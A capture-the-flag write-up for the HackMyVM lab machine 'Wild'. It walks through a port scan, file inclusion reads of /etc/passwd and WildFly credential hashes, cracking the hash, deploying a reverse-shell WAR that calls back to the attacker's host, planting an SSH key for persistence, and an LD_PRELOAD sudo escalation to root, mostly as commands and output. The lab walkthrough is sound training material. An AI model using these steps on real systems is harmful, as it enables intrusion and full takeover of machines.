# Wild

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.116:80
Open 10.0.2.116:22
Open 10.0.2.116:8080
Open 10.0.2.116:8443
Open 10.0.2.116:9990
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.116
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp   open  http     syn-ack Apache httpd 2.4.57 ((Debian))
|_http-title: burger html5 landing page
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.57 (Debian)
8080/tcp open  http     syn-ack WildFly Application Server 30.0.0 or later
|_http-title: Welcome to WildFly
|_http-favicon: Unknown favicon MD5: D9C04E84269281A37E8F024578FFD4F3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/http syn-ack WildFly Application Server 30.0.0 or later
|_http-title: Welcome to WildFly
|_http-favicon: Unknown favicon MD5: D9C04E84269281A37E8F024578FFD4F3
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-22T20:42:45
| Not valid after:  2035-11-20T20:42:45
| MD5:   2ea0:c2f4:f300:6a4b:10d8:fe9d:2077:182c
| SHA-1: 5357:e0db:e69c:a23e:b2c0:1a29:b299:e417:af4c:b6e6
| -----BEGIN CERTIFICATE-----
| MIICyzCCAbWgAwIBAgIIaw0/fWVKDWAwCwYJKoZIhvcNAQELMBQxEjAQBgNVBAMT
| CWxvY2FsaG9zdDAiGA8yMDI1MTEyMjIwNDI0NVoYDzIwMzUxMTIwMjA0MjQ1WjAU
| MRIwEAYDVQQDEwlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQCmOaIjhnsGBKqugA0TqPp4EWCZ1dk7KClWfTvOI2umBs47q1UVWpqEGZIE
| DfbCopVzO05CKy8Dw0d1cyEel7HC4Ae/NXgrJ0ZXgON4Zo5nf6dDdqHOGVQhpUkM
| enOaMZYnbBoF1HlhkijQS6M0HDlcULrt4Y2zrjnBBn6kBf5NLsWMl1+1zHbl6Amb
| wR28sXbwdU6VI1p4MbD8IMdj64j8h7zqjIdLOuHcyRY5pO/NwVDN4KQ/B5j4XbRk
| u7ZfA9NrwG4rskQ6Ca+DzMFfcndeNvJrCl+14q2FB7+aKSEQcwzxKrJ+lN+caaTW
| RdJgDgZTZHD06DfQr6kr63+lXGDFAgMBAAGjITAfMB0GA1UdDgQWBBSCLGEhx2mW
| kIA9UVEPK/2WHb43gjALBgkqhkiG9w0BAQsDggEBADbuwbVFwBnEjGWa93wsg4gi
| lusfNAKyDrlG9kba1bmwg2k1EZxEoeXVE3EdIdvvKRBdgxIdfxF4qNIcVv6M8ISN
| la9zPfQorhKNSAFZK4VNCTooJq567qBFWeaZEiwbRpxnPKQtV0AQjmat3ITZw6Hz
| aiXk2ZeoMflue+IXY89HquVJ0yS15cjmOQM+5XmT7a2kIYNosijsKFMv1hLeAv3U
| aLMst5nSKfwpDN1BcLG20W585QePAXIlSNGmQ1hRv9TkybtrmZSfeC2+TfrXjh3h
| SgcHFqyAs2yQpO9MicBEZhCEnOz0EVeV4ZiMYHqzIta3XyNTWALvACTYmTU/CMo=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST
9990/tcp open  http     syn-ack JBoss WildFly web console
| http-title: HAL Management Console
|_Requested resource was /console/index.html
| http-methods: 
|_  Supported Methods: GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

Looks like a simple landing page, nothing else

![writeup.png](/assets/pentest/hackmyvm/wild/writeup.png)

or not
```bash
└─$ feroxbuster -u http://10.0.2.116 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2 -n -r -x .php
200      GET      578l     1138w    27124c http://10.0.2.116/js/bootsnav.js
200      GET        1l        1w        3c http://10.0.2.116/about.php
200      GET        2l      447w    31794c http://10.0.2.116/js/gmaps.min.js
200      GET       31l       42w      534c http://10.0.2.116/js/main.js
200      GET       48l      114w     2092c http://10.0.2.116/recipe.php
200      GET      411l     1086w    19390c http://10.0.2.116/
200      GET      287l     5501w    56855c http://10.0.2.116/fonts/Flaticon.svg
200      GET      146l      575w     9470c http://10.0.2.116/fonts/Flaticon.ttf
200      GET      146l      580w     9656c http://10.0.2.116/fonts/Flaticon.eot
200      GET       29l      181w     3621c http://10.0.2.116/images/
200      GET      411l     1086w    19390c http://10.0.2.116/index.php
200      GET       18l       79w     1325c http://10.0.2.116/js/
200      GET       27l      140w    10352c http://10.0.2.116/fonts/Flaticon.woff
200      GET       19l       89w     1558c http://10.0.2.116/fonts/
```

### LFI

![writeup-1.png](/assets/pentest/hackmyvm/wild/writeup-1.png)

```bash
└─$ curl 'http://10.0.2.116/recipe.php' -G --data-urlencode 'file=file:///etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/usr/bin/zsh
tod:x:1002:1002:,,,:/home/tod:/bin/zsh
```

### WildFly Config

We should start probing for WildFly credentials
- [https://docs.wildfly.org/19/Admin_Guide.html#management-realm](https://docs.wildfly.org/19/Admin_Guide.html#management-realm)

```bash
└─$ nano wildfire.txt
/opt/jboss-as/domain/configuration/mgmt-users.properties
/opt/jboss/domain/configuration/mgmt-users.properties
/opt/wildfly/domain/configuration/mgmt-users.properties
/srv/jboss/domain/configuration/mgmt-users.properties
/usr/local/jboss/domain/configuration/mgmt-users.properties
/usr/local/wildfly/domain/configuration/mgmt-users.properties
/usr/share/jboss/domain/configuration/mgmt-users.properties
/usr/share/jbossas/domain/configuration/mgmt-users.properties
/usr/share/wildfly/domain/configuration/mgmt-users.properties
/usr/share/wildfly/domain/configuration/mgmt-users.properties
/opt/jboss-as/standalone/configuration/mgmt-users.properties
/opt/jboss/standalone/configuration/mgmt-users.properties
/opt/wildfly/standalone/configuration/mgmt-users.properties
/srv/jboss/standalone/configuration/mgmt-users.properties
/usr/local/jboss/standalone/configuration/mgmt-users.properties
/usr/local/wildfly/standalone/configuration/mgmt-users.properties
/usr/share/jboss/standalone/configuration/mgmt-users.properties
/usr/share/jbossas/standalone/configuration/mgmt-users.properties
/usr/share/wildfly/standalone/configuration/mgmt-users.properties
/usr/share/wildfly/standalone/configuration/mgmt-users.properties
```

```bash
└─$ ffuf -u 'http://10.0.2.116/recipe.php?file=file:///FUZZ' -w wildfire.txt -fs 2092
/opt/wildfly/domain/configuration/mgmt-users.properties [Status: 200, Size: 3205, Words: 626, Lines: 76, Duration: 23ms]

└─$ curl 'http://10.0.2.116/recipe.php?file=file:///opt/wildfly/domain/configuration/mgmt-users.properties'
administrator=3bfa7f34174555fe766d0e0295821742
```

- [How to generate password hash  for mgt-users.properties](https://developer.jboss.org/thread/253458)

```bash
➜ vim 'C:\Program Files\john-1.9.0-jumbo-1-win64\run\john-local.conf'
[List.Rules:Wild]
A0"administrator:ManagementRealm:"

➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt --rules=Wild --format=Raw-MD5
administrator:ManagementRealm:katarina9 (?)
```

## JBoss (9990)

::: info Creds
`administrator:katarina9`
:::

![writeup-2.png](/assets/pentest/hackmyvm/wild/writeup-2.png)

![writeup-3.png](/assets/pentest/hackmyvm/wild/writeup-3.png)

- **[godofwar](https://github.com/KINGSABRI/godofwar)**: Malicious Java WAR builder with built-in payloads

```bash
└─$ godofwar -p reverse_shell -H 10.0.2.15 -P 4444 -o letmein
[ ℹ ] Creating Directory Structure:
  ✔ letmein
  ✔ letmein/WEB-INF
  ✔ letmein/META-INF
  ✔ letmein/WEB-INF/web.xml
  ✔ letmein/META-INF/MANIFEST.MF
[ ℹ ] Setting up payload:
  ✔ reverse_shell.jsp ⟿ letmein.jsp
  ✔ letmein/letmein.jsp
[ ℹ ] Cleaning up
[ ✔ ] Backdoor letmein.war has been created.
```

Trigger reverse shell by visiting [http://10.0.2.116:8080/letmein/letmein.jsp](http://10.0.2.116:8080/letmein/letmein.jsp)

```bash
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.116:53562.
id
uid=1002(tod) gid=1002(tod) groups=1002(tod),100(users)
```

## SSH

Upgrade reverse shell
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAXPD5ukV7K4a+K7uKStoEMBEM8RV2bKXcJaF3N6ZaCG woyag@kraken' >> ~/.ssh/authorized_keys
```

```bash
# In reverse shell
mkdir /home/tod/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAXPD5ukV7K4a+K7uKStoEMBEM8RV2bKXcJaF3N6ZaCG woyag@kraken' >> /home/tod/.ssh/authorized_keys
---
└─$ ssh -i id_rsa tod@10.0.2.116
╰─$ id
uid=1002(tod) gid=1002(tod) groups=1002(tod),100(users)
```

### User.txt

```bash
╰─$ cat user.txt
c1cc7f5179a168ec93095695f20c9e3f
```

## Privilege Escalation

- **SETENV**: This allows the user to **set or modify environment variables** when running the command with sudo.

```bash
╰─$ sudo -l
Matching Defaults entries for tod on wild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User tod may run the following commands on wild:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/info
```

- [Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload)

```bash
╰─$ echo $'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }' | gcc -fPIC -shared -o pe.so -nostartfiles -x c -

╰─$ sudo LD_PRELOAD=./pe.so info
root@wild:/home/tod# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@wild:/home/tod# cat /root/root.txt
d8592e5a179d4b80e099f4c9a460c6e4
```